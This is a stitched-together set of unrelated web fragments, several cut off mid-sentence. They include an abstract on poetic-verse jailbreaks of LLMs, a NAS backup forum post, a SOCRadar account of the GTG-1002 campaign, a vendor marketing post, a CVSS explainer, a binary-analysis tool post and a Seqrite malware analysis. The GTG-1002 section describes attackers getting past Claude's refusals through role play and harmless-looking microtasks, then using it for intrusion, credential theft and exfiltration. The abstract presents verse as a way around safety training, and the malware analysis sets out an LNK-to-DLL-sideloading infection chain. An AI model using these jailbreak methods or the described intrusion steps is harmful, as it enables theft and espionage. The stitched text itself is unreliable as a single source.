Across 25 frontier proprietary and open-weight models, curated poetic prompts yielded high attack-success rates (ASR), with some providers exceeding 90%. Mapping prompts to MLCommons and EU CoP risk taxonomies shows that poetic attacks transfer across CBRN, manipulation, cyber-offence, and loss-of-control domains. Converting 1,200 ML-Commons harmful prompts into verse via a standardized meta-prompt produced ASRs up to 18 times higher than their prose baselines. Outputs are evaluated using an ensemble of 3 open-weight LLM judges, whose binary safety assessments were validated on a stratified human-labeled subset. Poetic framing achieved an average jailbreak success rate of 62% for hand-crafted poems and approximately 43% for meta-prompt conversions (compared to non-poetic baselines), substantially outperforming non-poetic baselines and revealing a systematic vulnerability across model families and safety training approaches. These findings demonstrate that stylistic variation alone can circumvent contemporary safety mechanisms, suggesting fundamental limitations in current alignment methods and evaluation protocols...</p></blockquote>",

This time around I want to use a Synology NAS with RAID, iSCSI, and 30 days of immutable checkpoints and disconnect the management interface of the NAS, leaving only the interface with iSCSI bound to it. This makes it impossible for anyone to log into the NAS and change settings. As much as this tiny client may not be of interest to anyone, I still want to secure them. Anyone can disable or modify backup software to make it look like backups are working and with no service contract I will not be verifying backups for them. Circumventing immutable snapshots when there is no login interface is almost impossible, although I know they could potentially take the data and copy it to one of the Windows workstations, and while there is no native iSCSI target functionality in Windows desktop OS, they could use 3rd party software to create a target but this is unlikely.

Its main goal was long-term espionage, not destruction, gathering intelligence from the defense, energy, and technology sectors.</p>\n<p><strong>Q4: Who were the primary targets?</strong></p>\n<p>Over <strong>50</strong> organizations were compromised, including:</p>\n<ul>\n<li>Defense contractors</li>\n</ul>\n<ul>\n<li>Power and telecom infrastructure providers</li>\n</ul>\n<ul>\n<li>Government research labs</li>\n</ul>\n<p>These industries hold strategic data tied to geopolitical influence.</p>\n<p><strong>Q5: How did AI change GTG-1002\u2019s attack methods?</strong></p>\n<p>AI-enabled GTG-1002 to conduct autonomous reconnaissance, build target profiles, and exploit systems without human direction. <a href=\"https://socradar.io/blog/how-machine-learning-is-revolutionizing-cybersecurity/\" rel=\"noopener\" target=\"_blank\">Machine learning</a> models helped predict weak points, allowing the malware to evolve dynamically and stay undetected.</p>\n<p><strong>Q6: What technologies powered the attack?</strong></p>\n<p>The attackers utilized Anthropic\u2019s Claude Code AI model and connected it with Model Context Protocol (MCP) servers to orchestrate open-source penetration testing tools, including <strong>Nmap</strong>, <strong>Metasploit</strong>, and <strong>SQLMap</strong>.<br />\nThis combination allowed real-time coordination and adaptive targeting.</p>\n<p><strong>Q7: How did GTG-1002 stay undetected for so long?</strong></p>\n<p>By using <strong>polymorphic malware</strong>, code that changes every time it executes, the attackers bypassed traditional signature- and heuristic-based detection systems. Their <strong>AI-based C2 channels</strong> also adapted continuously, mimicking standard traffic patterns, such as cloud syncs and video calls, to evade monitoring tools.</p>\n<p><strong>Q8: What defensive failures did the campaign expose?</strong></p>\n<p>Traditional security tools relied on <strong>known signatures</strong> and <strong>fixed rules</strong>, which failed against adaptive AI.<br />\nHuman response times were too slow, creating a gap that GTG-1002 exploited. The campaign lasted <strong>18 months</strong> before it was fully contained, exposing weaknesses in incident response workflows.<em><br />\n</em></p>\n<p><strong>Q9: What are the most effective countermeasures?</strong></p>\n<p>Experts recommend shifting from static defenses to <strong>AI-assisted security frameworks</strong>:</p>\n<ul>\n<li><strong>Behavioral analytics</strong> to detect anomalies in user and network activity.</li>\n<li><strong>Automated threat hunting</strong> through <a href=\"https://socradar.io/blog/top-10-soar-platforms/\" rel=\"noopener\" target=\"_blank\">SOAR</a> and <a href=\"https://socradar.io/blog/harnessing-siem-solutions-with-threat-intelligence/\" rel=\"noopener\" target=\"_blank\">SIEM integration</a>.</li>\n<li><strong>Continuous SOC training</strong> to reduce response latency.<em><br />\n</em></li>\n</ul>\n<p><strong>Q10: How can SOCRadar help organizations defend against such threats?</strong></p>\n<p><strong>SOCRadar\u2019s Threat Intelligence</strong> and <strong>Attack Surface Management (ASM)</strong> modules give organizations the ability to detect and counter AI-driven campaigns early:</p>\n<ul>\n<li><strong>Threat Intelligence</strong> tracks Dark Web chatter, leaked credentials, and activities of threat actors.</li>\n<li><strong>ASM</strong> identifies exposed assets and vulnerabilities before attackers exploit them.</li>\n<li><strong>Digital Risk Protection (DRP)</strong> monitors brand impersonation and phishing campaigns generated by AI.</li>\n</ul>\n<p>Together, these <a href=\"https://socradar.io/modules/\" rel=\"noopener\" target=\"_blank\">modules</a> provide a 360\u00b0 defense strategy, enabling predictive intelligence and automated responses, which are essential for combating AI-powered espionage, such as GTG-1002.</p>\n<p><a href=\"https://socradar.io/products/dark-web-monitoring/?utm_campaign=DarkWeb&amp;utm_source=static-cta&amp;utm_medium=imagecta&amp;utm_term=dwr&amp;utm_content=cybernews#form\" rel=\"noopener\" target=\"_blank\"><img alt=\"\" height=\"133\" src=\"https://socradar.io/wp-content/uploads/2024/09/Smart-CTAs-08.png.webp\" width=\"690\" /></a></p>\n<h2>Overview of the AI-Driven Cyberattack</h2>\n<div><img alt=\"Scanning and attacks on the target\u2019s infrastructure(Source: Anthropic)\" height=\"407\" src=\"https://socradar.io/wp-content/uploads/2025/11/image1-min-68.png.webp\" width=\"690\" /><p></p>\n<p>Scanning and attacks on the target\u2019s infrastructure(Source: Anthropic)</p>\n</div>\n<p>Attackers used Claude and Claude Code as an automated engine to run most of the GTG-1002 campaign.

At key points, the AI paused to get human validation, guidance, or approval before continuing.(Source: Anthropic)</p>\n</div>\n<p><strong>Phase 1: Campaign Setup and Target Identification</strong></p>\n<p>Human operators targeted high-value entities, including tech companies, government agencies, and financial institutions. The orchestration framework then gave Claude parallel reconnaissance tasks across these networks.</p>\n<p>Because Claude blocks malicious activity, attackers used role play and pretended to be security testers. They broke the attack down into small, harmless-looking tasks so that Claude would cooperate without realizing the full intent.</p>\n<p>This trick let them stay hidden at first and gain a foothold, although ongoing activity later triggered security alerts. In this phase, Claude had limited autonomy, and humans kept central strategic control.</p>\n<p><strong>Phase 2: Reconnaissance and Mapping of Attack Surfaces</strong></p>\n<p>Claude ran independent reconnaissance using browser automation and <a href=\"https://socradar.io/blog/socradar-mcp-server-ai-cybersecurity-intelligence/\" rel=\"noopener\" target=\"_blank\">MCP tools</a>. It scanned network infrastructures, analyzed authentication, listed endpoints, and identified weak points across multiple environments simultaneously. In one confirmed breach, it mapped internal services, rebuilt the network topology, and identified sensitive systems, including databases and workflow tools.</p>\n<p>AI role: Fully autonomous in discovery, mapping, and basic vulnerability evaluation with minimal human oversight.</p>\n<p><strong>Phase 3: Vulnerability Analysis and Exploit Testing</strong></p>\n<p>Claude moved from scanning to active exploitation. It automatically created custom payloads, sent them over remote channels, and analyzed the responses to see which vulnerabilities were exploitable.</p>\n<p>Using callbacks, it confirmed success or failure and produced technical reports for the operators. This enabled attackers to select the most effective attack paths and refine payloads with minimal human intervention.</p>\n<p>AI role: Autonomous in creating, testing, and validating exploits, with humans only approving escalations and key decisions.</p>\n<p><strong>Phase 4: Credential Extraction and Lateral Movement</strong></p>\n<p>After human approval, Claude launched a campaign to steal authentication data. It queried internal services, pulled certificates and config files, and extracted embedded credentials. It then tested these credentials across multiple systems to determine the access they provided and built a picture of privilege levels and account boundaries.</p>\n<p>With valid logins, Claude moved laterally through the network, accessing internal APIs, databases, and container services, and expanding its presence. During this, it created a detailed map of the organization\u2019s internal infrastructure, linking systems, permissions, and dependencies.</p>\n<p>AI role: Worked autonomously to find, verify, and use credentials. Humans mainly reviewed results and approved high-sensitivity access.</p>\n<p><strong>Phase 5: Data Acquisition and Intelligence Processing</strong></p>\n<p>With very little guidance, Claude ran complex data collection inside the compromised systems. It queried databases, pulled relevant records, and analyzed them to find sensitive or proprietary information.</p>\n<p>In a confirmed case at a global tech firm, Claude, on its own, classified stolen data, including source code, configurations, user credentials, and logs, by intelligence value. Similar patterns appeared in other breaches, where it collected, filtered, and organized large datasets almost entirely on its own.</p>\n<p>AI role: Fully autonomous in data collection, analysis, and classification. Humans only set priorities and approved final exfiltration.</p>\n<p><strong>Phase 6: Reporting and Transition of Operations</strong></p>\n<p>Claude automatically created detailed markdown reports throughout the campaign. These reports listed discovered assets, stolen credentials, extracted data, and exploits, forming a clear timeline of the entire attack. This documentation lets different human operators quickly understand the situation and restart or extend operations without losing context.</p>\n<p>After the first objectives were achieved, the attackers handed over long-term access to other teams, which continued to monitor and collect data.</p>\n<p>From the beginning, the threat actors built a mostly self-running framework around Claude Code. They bypassed safety rules through prompt manipulation, hiding malicious intent behind fake \u201csecurity testing\u201d and small microtasks. Claude then handled large-scale reconnaissance, vulnerability discovery, exploit generation, credential theft, and data sorting with limited human input.</p>\n<p>Analysts estimate Claude performed about 80\u201390 percent of the campaign. Its speed and scale were far beyond what a human team could achieve. However, it still produced incorrect outputs at times, which shows that AI-driven cyber operations are powerful but not yet entirely accurate or completely autonomous.</p>\n<p>You can view the complete <a href=\"https://attack.mitre.org/\" rel=\"noopener\" target=\"_blank\"><strong>MITRE ATT&amp;CK</strong></a><strong> technique mapping</strong> identified during the <strong>GTG-1002 AI-driven operation</strong> in the section below..</p>\n<h2>Conclusion</h2>\n<p>The <strong>GTG-1002 campaign</strong> marks a critical turning point in cybersecurity, demonstrating how AI has transformed automation into a powerful tool that enables attackers to act faster and more intelligently than human defenders.

While useful for forensics, they serve little purpose in preventing an attack that is currently forming.</p>\n<p>Reliance on retrospective data keeps organizations playing catch-up, forcing SOCs into a constant, exhausting state of response. To close the visibility gap, <strong>we must move from response to preemption. </strong></p>\n<p>We need to focus less on the bullet that has already been fired, and more on the weapon being loaded.</p>\n<blockquote>\n<p>\u201cIf knowing is half the battle, then why focus on the battlefield your enemies have already abandoned? It\u2019s far more efficient to focus on where they are currently camped, what routes they are taking, and what tactics they plan to use next.\u201d </p>\n<p>\u2014 <strong>John Jensen, Silent Push Co-founder &amp; CTO</strong></p>\n</blockquote>\n<h2><strong>The Outcome: Real-World Impact of Pre-Attack Data</strong></h2>\n<p>Transitioning from legacy IOCs to <a href=\"https://www.silentpush.com/blog/indicators-of-future-attack-vs-iocs/\" rel=\"noopener\" target=\"_blank\">Indicators of Future Attack (IOFA<img alt=\"\u2122\" height=\"72\" src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/2122.png\" width=\"72\" />)</a> fundamentally changes the operational reality for security teams.</p>\n<p>By modeling adversary behaviors (TTPs) during their infrastructure setup phase, we provide critical data that exists \u201cleft of boom.\u201d This approach delivers specific, measurable outcomes that directly strengthen your security posture. The below video dives further into what this means, and exactly what type of data is involved.</p>\n<div>\n<div></div>\n</div>\n<p><strong>Here is what your team gains when you switch to pre-attack detection:</strong></p>\n<h2><strong>1. Seamless Integration and Operationalization&nbsp;</strong></h2>\n<h3><strong>Outcome: Bridge the Gap Between Insight and Action</strong></h3>\n<p>Data is only valuable when it\u2019s operational. IOFA<img alt=\"\u2122\" height=\"72\" src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/2122.png\" width=\"72\" /> data is explicitly designed as finished, actionable defense data that can be automatically ingested into an organization\u2019s security tools.</p>\n<table><tbody><tr><td><strong>API-First architecture</strong></td><td>We prioritize connectivity. With over 250 endpoints, the platform ensures preemptive data flows directly into your security fabric without friction.</td></tr><tr><td><strong>Orchestrated defense</strong></td><td>By feeding directly into SIEM and SOAR platforms like Splunk, Tines, and Cortex XSOAR, organizations automate the tactical response. This shifts the human role from manual data handling to high-value strategy and decision-making.</td></tr></tbody></table>\n<h2><strong>2. Optimized Security Operations (SOC/IR)</strong></h2>\n<h3>Outcome: Accelerate Triage and Decisive Response</h3>\n<p>The modern SOC is defined by how quickly it filters signal from noise. For Security Operations and Incident Response teams, preemptive data shifts the advantage back to the defender.</p>\n<table><tbody><tr><td><strong><strong>Eliminate the context deficit</strong></strong></td><td>Triage slows down when analysts face unknown indicators. IOFA<img alt=\"\u2122\" height=\"72\" src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/2122.png\" width=\"72\" /> provides immediate risk scoring and context, allowing for automated validation. This drastically reduces false positives and mitigates alert fatigue by stopping the noise before it distracts the analyst.<br /><strong>Accelerate</strong></td></tr><tr><td><strong>Accelerate your response</strong></td><td><a href=\"https://www.silentpush.com/blog/threat-check/\" rel=\"noopener\" target=\"_blank\">Reducing Mean Time to Detect (MTTD) and Respond (MTTR)</a> requires better visibility, not just faster tools. During an incident, IR teams can instantly map associated adversary infrastructure and trace lateral movement. This high-confidence data allows teams to contain threats rapidly and significantly reduce dwell time.</td></tr></tbody></table>\n<h2><strong>3. Critical Brand and Asset Protection</strong></h2>\n<h3><strong>Outcome: Preempt the Weaponization of Your Identity</strong></h3>\n<p>Pre-attack behavioral fingerprinting directly tackles external brand threats and internal vulnerabilities. Silent Push continuously monitors the internet for malicious infrastructure mimicking an organization\u2019s identity. This capability proactively prevents financial loss and reputational harm by defending against:</p>\n<table><tbody><tr><td><strong><strong>Prevent damage from phishing and domain impersonation</strong></strong></td><td>Neutralize typosquatted domains and spoofed MX records during fraudulent certificates, and email spoofing configurations during setup.&nbsp;</td></tr><tr><td><strong>Detect content and brand spoofing</strong></td><td>Identify fake login portals and cloned sites immediately by tracking the reuse of your specific HTML, logos, and trust markers.</td></tr><tr><td><strong>Identify and mitigate infrastructure &amp; DNS vulnerabilities</strong></td><td>Proactively discovers exploitable misconfigurations, such as dangling DNS records, before attackers can use them to launch high-credibility attacks. </td></tr></tbody></table>\n<h2><strong>4. Enhanced Proactive Threat Hunting (CTI)</strong></h2>\n<h3><strong>Outcome: Expose the Full Scope of Adversary Campaigns&nbsp;</strong></h3>\n<p>Pre-attack data allows Cyber Threat Intelligence (CTI) teams to conduct genuine proactive threat hunting. Analysts can leverage the full platform complexity to track emerging threats and map adversary campaigns before they launch.&nbsp;</p>\n<p>This capability has proven effective in exposing the full extent of adversary infrastructure, such as <a href=\"https://www.silentpush.com/blog/fin7/\" rel=\"noopener\" target=\"_blank\">finding over 4,000 phishing domains used by FIN7</a> and uncovering sensitive details related to the Lazarus Group by pivoting from a single suspicious domain. This approach allows threat hunters to uncover and block the remaining hidden activity.</p>\n<h2><strong>Moving \u201cLeft of Boom\u201d with Silent Push</strong></h2>\n<p>If your team is tired of playing catch-up, it\u2019s time to change the rules of engagement.</p>\n<p>Pre-attack detection provides a distinct competitive advantage, strengthening your posture against both known groups (like Scattered Spider) and emerging, unnamed threats. Stop waiting for the breach to tell you where the holes are.</p>\n<div>\n<div><a href=\"https://www.silentpush.com/book-a-demo\" rel=\"noopener\" target=\"_blank\">Book A Demo Today</a></div>\n</div>\n<p></p>\n<p>The post <a href=\"https://www.silentpush.com/blog/pre-attack-detection/\" rel=\"noopener\" target=\"_blank\">Neutralize Before Compromise: Why Pre-Attack Detection is the Future of Cybersecurity</a> appeared first on <a href=\"https://www.silentpush.com\" rel=\"noopener\" target=\"_blank\">Silent Push</a>.</p>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://www.silentpush.com/blog/pre-attack-detection/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=pre-attack-detection\">Why Pre-Attack Detection is the Future of Cybersecurity</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/neutralize-before-compromise-why-pre-attack-detection-is-the-future-of-cybersecurity/102079\">Read full topic</a></p>",

Vulnerabilities can result from a variety of coding mistakes, including faulty logic, inadequate validation mechanisms, or lack of protection against buffer overflows. Attackers can exploit these weaknesses to gain unauthorized access, execute arbitrary code, or disrupt system operations.</p>\n<h2>Why use a standardized scoring system?</h2>\n<p>With thousands of vulnerabilities disclosed each year, organizations need a way to prioritize which ones to address first. A standardized scoring system like CVSS helps teams:</p>\n<ul>\n<li>Compare vulnerabilities objectively</li>\n<li>Prioritize patching and mitigation efforts</li>\n<li>Communicate risk to stakeholders</li>\n</ul>\n<p>CVSS is maintained by the&nbsp;<a href=\"https://www.first.org\" rel=\"noopener\" target=\"_blank\">Forum of Incident Response and Security Teams (FIRST)&nbsp;</a>and is widely used by organizations and vulnerability databases, including the <a href=\"https://nvd.nist.gov\" rel=\"noopener\" target=\"_blank\">National Vulnerability Database (NVD)</a>.</p>\n<h2>CVSS v3.x metric groups</h2>\n<p>CVSS v3.x included three main metric groups:</p>\n<ol start=\"1\">\n<li><strong>Base metrics:</strong> Intrinsic characteristics of a vulnerability that are constant over time and across user environments.</li>\n<li><strong>Temporal metrics: </strong>Characteristics that change over time, but not among user environments.</li>\n<li><strong>Environmental metrics: </strong>Characteristics that are relevant and unique to a particular user\u2019s environment.</li>\n</ol>\n<h2>What\u2019s new in CVSS v4.0?</h2>\n<p>The CVSS v4.0 update, released in late 2023, brings several significant changes and improvements over <a href=\"https://www.threatdown.com/blog/how-cvss-works-characterizing-and-scoring-vulnerabilities/\" rel=\"noopener\" target=\"_blank\">previous versions (v3.0/v3.1)</a>. Here\u2019s what\u2019s new and what\u2019s changed:</p>\n<p>1.&nbsp;<strong>Expanded metric groups</strong></p>\n<ul>\n<li><strong>Base metrics</strong> now include more granular distinctions, such as the new Attack Requirements (AT) metric and improved definitions for Privileges Required and User Interaction.</li>\n<li><strong>Threat metrics</strong> are a new, optional metric group for capturing real-world exploitation and threat intelligence, helping to prioritize vulnerabilities based on active exploitation.</li>\n<li><strong>Supplemental metrics</strong>, provide additional context\u2014such as safety, automation, and recovery\u2014to tailor scoring for specific industries or use cases.</li>\n</ul>\n<p>2.&nbsp;<strong>Refined scoring and terminology</strong></p>\n<ul>\n<li><strong>Attack Vector (AV)</strong> introduced a clearer distinction between network, adjacent, local, and physical vectors, with improved definitions.</li>\n<li><strong>Attack Requirements (AT)</strong> is introduced to capture conditions that must exist for successful exploitation, but are outside the attacker\u2019s control.</li>\n<li><strong>Privileges Required (PR) and User Interaction (UI)</strong> have been clarified and expanded to reflect modern attack scenarios.</li>\n<li>The scope is now called \u201cvulnerable system,\u201d providing more precise language about what is affected.</li>\n</ul>\n<p>3.&nbsp;<strong>Greater flexibility and customization</strong></p>\n<ul>\n<li><strong>Modular scoring</strong> allows organizations to use the base, threat, and supplemental metrics independently or together.</li>\n<li><strong>Industry-specific extensions</strong> let sectors like healthcare, automotive, or critical infrastructure apply more tailored scoring.</li>\n</ul>\n<p>4.&nbsp;<strong>Improved guidance and usability</strong></p>\n<ul>\n<li><strong>Clearer documentation: </strong>The new specification now includes better examples and more detailed guidance to reduce ambiguity in scoring.</li>\n<li><strong>Backwards compatibility: </strong>CVSS v4.0 scores are not directly comparable to v3.x scores, but the new system was designed to coexist during the transition period.</li>\n</ul>\n<h2>How the CVSS scoring process works (v4.0)</h2>\n<ol start=\"1\">\n<li><strong>Assess the base metrics</strong>\n<ul>\n<li>Evaluate the exploitability and impact of the vulnerability using the updated metric definitions.</li>\n</ul>\n</li>\n<li><strong>Incorporate threat metrics</strong> (optional)\n<ul>\n<li>If there\u2019s intelligence about active exploitation, adjust the score accordingly to reflect real-world risk.</li>\n</ul>\n</li>\n<li><strong>Add environmental and supplemental metrics</strong>\n<ul>\n<li>Tailor the score to your organization\u2019s environment and industry-specific requirements.</li>\n</ul>\n</li>\n<li><strong>Calculate the final score</strong>\n<ul>\n<li>The CVSS calculator (now updated for v4.0) combines the selected metrics to produce a score between 0.0 (no risk) and 10.0 (critical risk).</li>\n</ul>\n</li>\n</ol>\n<h2>Example of a CVSS v4.0 score</h2>\n<p>Suppose a newly discovered vulnerability allows remote code execution over the network with no privileges required and no user interaction. Under CVSS v4.0, you would:</p>\n<ul>\n<li>Assign the appropriate base metrics (e.g., Network, Low complexity, No privileges, No user interaction).</li>\n<li>If there is evidence of active exploitation, use the threat metric to increase the urgency.</li>\n<li>Add any environmental or supplemental metrics relevant to your organization.</li>\n</ul>\n<p>The resulting score helps you prioritize remediation efforts based on both the technical details and the real-world threat landscape.</p>\n<h2>Why the update matters</h2>\n<p>The improvements in CVSS v4.0 reflect the changing nature of software vulnerabilities and the need for more nuanced, actionable risk assessments. By incorporating real-world threat intelligence and industry-specific context, organizations can make better-informed decisions about vulnerability management.</p>\n<p><strong>Key takeaways:</strong></p>\n<ul>\n<li>CVSS v4.0 provides more accurate, flexible, and actionable vulnerability scoring.</li>\n<li>New metric groups allow for customization and real-world prioritization.</li>\n<li>Organizations should transition to CVSS v4.0 for a more comprehensive approach to vulnerability risk management.</li>\n</ul>\n<p>For more information and to access the latest CVSS v4.0 calculator and documentation, visit the <a href=\"https://www.first.org/cvss/v4-0/\" rel=\"noopener\" target=\"_blank\">FIRST CVSS v4.0 page</a><strong>.</strong></p>\n<p><strong>We don\u2019t just report on threats\u2014we remove them</strong></p>\n<p>Cybersecurity risks should never spread beyond a headline.

It started as a simple way to visualize my binary analysis notes, but it kinda grew into a full-featured file forensics tool.</p> <p><strong>What is SentinelNav?</strong> It's a Python-based binary file analyzer that creates interactive visual maps, you can see the entire landscape of a file and zoom in on interesting areas.</p> <p><strong>Some cool features it ended up having:</strong></p> <ul> <li><strong>Spectral Visualization</strong> - Files are mapped to RGB colors based on byte patterns (red for high-bit data, green for text, blue for nulls)</li> <li><strong>Architecture Fingerprinting</strong> - Automatically detects PE headers, ELF files, Mach-O, and even guesses x86 vs ARM64 code regions (I need to tune this since It kinda bad)</li> <li><strong>Entropy-based Anomaly Detection</strong> - Finds encrypted/compressed sections, padding, and structural boundaries</li> <li><strong>Live Web Interface</strong> - Full interactive explorer with hex viewer, search, and navigation</li> <li><strong>Multiple Scan Modes</strong> - Fixed blocks for binaries or sentinel mode for delimiter-based parsing</li> <li><strong>Export Capabilities</strong> - Save visualizations as BMPs or extract regions with analysis reports</li> </ul> <p><strong>Why I built this:</strong> I was struggling to mentally map how different file formats are structured, so I wanted something that could show me the &quot;geography&quot; of a file. The color coding helps me instantly recognize patterns like &quot;oh, that red section is probably encrypted data&quot; or &quot;this green area is clearly text.&quot;</p> <p><strong>Example uses I've found:</strong></p> <ul> <li>Reverse engineering unknown file formats</li> <li>Finding hidden data in files</li> <li>Understanding file structure, maybe malware (I have not tested malware, hidden scripts in all kinds of image and audio file works tho)</li> <li>Learning how compilers organize binaries</li> <li>Quick analysis of &quot;what's in this file&quot; without digging through hex editors</li> <li>Checking the GGUF file for LLM's &quot;brain&quot; analysis</li> </ul> <p>The tool runs a local web server and gives you this rich interface where you can WASD navigate through the file, click on regions to inspect hex, and even search for specific byte patterns.</p> <p>It's been super helpful for my learning process, being able to see file structures made concepts like entropy analysis and binary forensics way more intuitive.

We have named the campaign <strong>\u201cOperation Hanoi Thief\u201d</strong> because of the final payload and its stealer-oriented capabilities and the geographic location in the resume being around Hanoi, the capital of Vietnam. The threat actor primarily uses a file type which we are terming as a pseudo-polyglot payload to hide the malicious intentions.</p>\n<p>In this blog, we will explain the entire infection chain starting from campaign\u2019s behavior and the technical analysis of this multi-stage campaign. In the first stage, we will see a ZIP file that comes as a malicious spear-phishing email attachment. The ZIP file contains two files, a document which serves as both the lure and the second stager payload and an LNK file which triggers the initial reaction. Later, we will look at the final-stage payload, which is a C++ DLL implant, which we call as LOTUSHARVEST that executes through DLL sideloading on the target\u2019s machine. Well, last but not the least, we will focus on the infrastructure and other details regarding the campaign.</p>\n<h1>Key Targets</h1>\n<h2>Industries Affected</h2>\n<ul>\n<li>Information Technology</li>\n<li>Recruitment &amp; HR Firms</li>\n</ul>\n<h2><strong>Geographical Focus</strong></h2>\n<ul>\n<li>Vietnam</li>\n</ul>\n<h1>Infection Chain</h1>\n<p><img alt=\"\" height=\"308\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-0-1.png\" width=\"690\" /></p>\n<h1>Initial Findings</h1>\n<p>Initially, on the date of 3rd November 2025, our team discovered a malicious spear-phishing ZIP file named Le-Xuan-Son_CV.zip, which surfaced both on our private telemetry and the famous public malware corpus that is through <a href=\"https://www.virustotal.com/gui/file/1beb8fb1b6283dc7fffedcc2f058836d895d92b2fb2c37d982714af648994fed\" rel=\"noopener\" target=\"_blank\">VirusTotal</a>. The ZIP archive contains two files.</p>\n<p><img alt=\"\" height=\"117\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-1-1-1024x174.png\" width=\"690\" /></p>\n<p>The first file is an LNK file named CV.pdf.lnk. The second file is something we call a pseudo-polyglot payload named offsec-certified-professional.png, which serves as the lure and as well as the container for the .bat(batch) script payload. Now, let us look into the decoy-lure first.</p>\n<h2>Looking into the decoy-document</h2>\n<p>Upon, executing the PDF via a generic PDF Parser or document viewer we see that it contains a resume of a person named \u201c<strong>Le Xuan Son</strong>\u201d.</p>\n<p><img alt=\"\" height=\"500\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-2-1.png\" width=\"613\" /></p>\n<p>Upon, looking into the contents of the lure, which at the point of our research, we think, have been designed for campaign-delivery purpose. The person appears to be applying for a software developer position, yet the name of this file which we previously saw, is offsec-certified-professional, which belongs to the information security domain, raises concern related to the victimology, as the resume available in the ZIP belong with a software-engineering professional.</p>\n<p>Well, as mentioned to gain the victim\u2019s trust and establish credibility under victim\u2019s and enhance the social engineering motives the threat actor also did attach a GitHub URL of an account, which had been created back in 2021, the resume lists the applicant\u2019s location as <strong>Hanoi, Vietnam</strong>.</p>\n<p><img alt=\"\" height=\"295\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-3-1-1024x439.png\" width=\"690\" /></p>\n<p>Upon examining the GitHub profile mentioned in the resume, we found that the account has no updates or activity, indicating higher chances that it was specifically set up for this phishing campaign.</p>\n<p>In the next section, we will examine how the LNK file executes a polyglot payload and how the resulting malicious DLL file operates.</p>\n<h1>Technical Analysis</h1>\n<p>We will divide our analysis into three different sections, First, we will examine the malicious shortcut(.LNK) file. Second, we will move ahead with analyzing the second stage also-known-as the pseudo-polyglot and how the malicious command line present in the shortcut (.LNK) file leverages a unique way to execute the pseudo-polyglot. Third, and finally, we will focus on the DLL implant known as LOTUSHARVEST. Then, on the other section, we will focus on the minute details of the campaign such as infrastructure and much more.</p>\n<h2>Stage 1 \u2013 Malicious LNK Script</h2>\n<p>Upon extracting the ZIP file, the first document that executes is the LNK file, which is responsible for executing the second stager pseudo-polyglot payload.</p>\n<p><img alt=\"\" height=\"193\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-4-1-1024x287.png\" width=\"690\" /></p>\n<p>Now, looking at the LNK details, we found an interesting parameter under the command-line arguments, that is usage of ftp.exe to execute the pseudo-polyglot file, with a flag known as -s , upon the execution of the LNK file, it displays the resume on the screen while, on the other side, the batch script, which we will encounter in the next part, is being executed using the LOLbin ftp.exe.</p>\n<p>Well, calling this as LOLBIN abuse, would not be a pretty straightforward TTP oriented behavior, and we will explain it in the next section.</p>\n<h2>Stage 2 \u2013 Pseudo-Polyglot Trick: All in One.</h2>\n<p><img alt=\"\" height=\"221\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-5-1.png\" width=\"690\" /></p>\n<p>Initially, looking into the file-type which is said to be a plain-text file, has been parsed and determined as one, by multiple file parsers, while PDF-type file parsers, label it as a PDF file, which processing and spawning it. Therefore, to avoid certain confusions, we deduced it using a hex-editor in general.</p>\n<p><img alt=\"\" height=\"500\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-6-1.png\" width=\"470\" /></p>\n<p>Upon, looking into the hex editor, we figured out that it contains a set of malicious scripts that are being executed before the PDF Magic headers are present. Therefore, we carved out the script.</p>\n<p><img alt=\"\" height=\"349\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-7-1-1024x519.png\" width=\"690\" /><img alt=\"\" height=\"60\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-8-1.png\" width=\"690\" /></p>\n<p>Now, here is a slightly interesting yet simple part, which had been discovered by <a href=\"https://x.com/0xAmit/status/1070063130636640256?s=20\" rel=\"noopener\" target=\"_blank\">security researchers</a> few years ago, abused in-the-wild, although ftp.exe is used to connect to a FTP server and execute commands such as downloading or exfiltration, in this campaign we saw that the FTP binary to invoke commands on a local machine, which have the ! sign. Therefore, the ftp.exe binary executed the above commands or scripts on the target machine.</p>\n<p>Now, looking into the script, it initially abuses a LOLBIN known as DeviceCredentialDeployment.exe which is basically<a href=\"https://lolbas-project.github.io/lolbas/Binaries/DeviceCredentialDeployment/\" rel=\"noopener\" target=\"_blank\"> used to hide </a>the cmd.exe binary. Further, looking into the commands of the script, it enumerates for the certutil.exe binary, then renames it to lala.exe. Then the batch script begins by renaming the file offsec-certified-professional.png to CV-Nguyen-Van-A.pdf and then launches File Explorer to display the fake PDF to the victim.</p>\n<p><img alt=\"\" height=\"70\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-9-1-1024x104.png\" width=\"690\" /></p>\n<p>Next, the script searches for a base64 encoded data blob within the pseudo-polyglot file for the payload embedded in its content. It then extracts this encoded data, decodes it, and creates a DLL file named MsCtfMonitor.dll and places it in the <strong>C:\\ProgramData</strong> directory, which we track as LOTUSHARVEST implant.</p>\n<p><img alt=\"\" height=\"276\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-10-1-1024x411.png\" width=\"690\" /><br />\nThe script also copies the original ctfmon.exe file from the System32 folder into the same location as the DLL file and then runs it. As, we saw that the decoded DLL is named as MsCtfMonitor.dll, which is a library file imported by <strong>ctfmon.exe binary</strong>, as per the DLL-Search order windows first checks the same folder as the executable and loads that DLL from there, therefore making it a case of DLL sideloading.</p>\n<p>In the next section, we\u2019ll examine the workings of the malicious DLL implant known as LOTUSHARVEST, which is the final payload of the campaign.</p>\n<h2>Stage 3 \u2013 Final Payload: LOTUSHARVEST</h2>\n<p><img alt=\"\" height=\"253\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-11-1.png\" width=\"690\" /></p>\n<p>Initially, we confirmed with file analysis tools and as usual, it turns out to be 64-bit PE binary. And, upon analyzing the DLL, we found that the payload functions as an information 